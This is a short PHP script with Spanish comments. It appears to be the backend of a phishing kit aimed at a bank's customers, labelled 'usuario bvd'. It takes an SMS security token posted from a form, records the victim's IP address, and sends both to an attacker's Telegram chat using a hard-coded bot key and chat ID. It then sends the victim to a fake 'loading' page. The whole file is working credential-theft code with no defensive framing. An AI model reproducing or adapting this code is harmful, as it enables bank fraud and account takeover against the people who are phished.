<?php
// Función para obtener la IP del usuario
function obtener_ip() {
    // Verificar si hay un proxy
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // La cabecera puede contener múltiples IPs, tomamos la primera
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        // Si hay un X-Real-IP
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } else {
        // Si no, usamos REMOTE_ADDR
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Recoger los datos del formulario
$correo = $_POST['sms']; // Token

// Obtener la dirección IP del cliente
$ip = obtener_ip(); // Dirección IP

// API key del chatbot de Telegram
$bot_api_key = '7687382163:AAGCjqj6jw7Hi8SXYZ-awru2HLVvGR35lY8';

// ID del chat al que se enviará el mensaje
$chat_id = '-1002338624446';

// Mensaje que se enviará al chatbot
$mensaje_para_chatbot = "🔐🧿 usuario bvd 🧿🔐\n" . "tok: " . $correo .  "\nip: " . $ip;

// URL de la API de Telegram para enviar mensajes
$telegram_url = "https://api.telegram.org/bot" . $bot_api_key . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);

// Enviar el mensaje al chatbot de Telegram
$response = file_get_contents($telegram_url);

// Redirigir a cargando2.html
header("Location: cargando2.html");
exit;
?>
